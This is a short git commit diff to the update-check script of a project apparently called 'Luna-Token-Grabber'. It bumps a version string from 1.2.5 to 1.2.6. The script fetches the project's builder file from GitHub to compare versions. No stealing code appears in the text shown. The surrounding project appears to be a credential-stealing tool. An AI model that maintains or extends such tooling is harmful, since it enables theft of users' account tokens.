43a823db8e622a6d6db2ba2c6675d4860aa78c84
judem909 <99215486+judem909@users.noreply.github.com>
2023-01-16 22:55:24 +0000

    new update

--- tools/update.py
+++ tools/update.py
@@ -6,7 +6,7 @@ import requests
 
 
 def check_update():
-    version_string = "VERSION = '1.2.5'"
+    version_string = "VERSION = '1.2.6'"
     code = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/builder.pyw').text
     if version_string in code:
         print('This version is up to date!')
